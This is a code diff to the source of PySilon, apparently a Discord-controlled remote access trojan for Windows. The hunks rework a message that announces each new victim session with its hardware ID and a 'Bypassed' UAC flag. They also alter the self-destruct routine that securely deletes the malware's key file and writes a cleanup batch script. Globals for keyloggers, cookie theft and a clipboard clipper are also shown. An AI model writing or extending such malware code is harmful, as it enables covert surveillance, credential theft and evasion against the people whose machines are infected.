@@ -195,11 +195,7 @@ async def on_ready():
             elif channel.name == 'recordings': channel_ids['recordings'] = channel.id
             elif channel.name == 'Live microphone': channel_ids['voice'] = channel.id
 
-    if IsAdmin():
-        await client.get_channel(channel_ids['main']).send('_ _\n_ _\n_ _```Starting new PC session at ' + current_time(True) + ' on HWID:' + str(hwid) + ' (Bypassed UAC!)' + '```\n_ _\n_ _\n_ _')
-    else:
-        await client.get_channel(channel_ids['main']).send('_ _\n_ _\n_ _```Starting new PC session at ' + current_time(True) + ' on HWID:' + str(hwid) + '```\n_ _\n_ _\n_ _')
-
+    await client.get_channel(channel_ids['main']).send(f"_ _\n_ _\n_ _```Starting new PC session at {current_time(True)} on HWID:{str(hwid)}{' && Bypassed!' if IsAdmin() else ''}```\n_ _\n_ _\n_ _")
 
 # [pysilon_var] !recording_startup 1
     
@@ -258,7 +254,7 @@ async def on_reaction_add(reaction, user):
                 if str(reaction) == '💀' and expectation == 'implosion':
                     await reaction.message.channel.send('```PySilon will try to implode after sending this message. So if there\'s no more messages, the cleanup was successful.```')
 # [pysilon_var] !registry_implosion 5
-                    secure_delete_file(filename, 10)
+                    secure_delete_file(f'C:\\Users\\{getuser()}\\{software_directory_name}\\PySilon.key', 10)
                     try: rmtree('rec_')
                     except: pass
                     with open(f'C:\\Users\\{getuser()}\\implode.bat', 'w', encoding='utf-8') as imploder:
@@ -281,7 +277,7 @@ async def on_raw_reaction_remove(payload):
 
 @client.event
 async def on_message(message):
-    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, filename, clipper_stop
+    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener, clipper_stop
     if message.author != client.user:
         if message.channel.id in channel_ids.values():
             if message.content == '.implode':
